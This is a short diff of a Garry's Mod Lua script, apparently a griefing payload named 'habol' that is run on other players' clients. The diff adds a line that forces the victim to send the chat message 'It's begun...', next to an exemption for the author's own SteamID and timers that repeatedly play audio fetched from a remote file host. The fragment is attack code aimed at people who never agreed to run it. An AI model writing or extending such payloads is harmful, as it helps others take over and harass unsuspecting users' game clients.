@@ -2,7 +2,8 @@
 if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then 
         chat.AddText("Somneone just tried to run habol on you! LOL")
         return 
-    end
+end
+LocalPlayer():ConCommand("say It's begun...")
 local jpegs = 0
 local s = sound
 local Song = false
@@ -207,6 +208,7 @@ _timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/
 --    oniichan()
 --    _timer.Adjust('paste',21,10000,oniichan())
 --end)
+
 
 
 --if check then
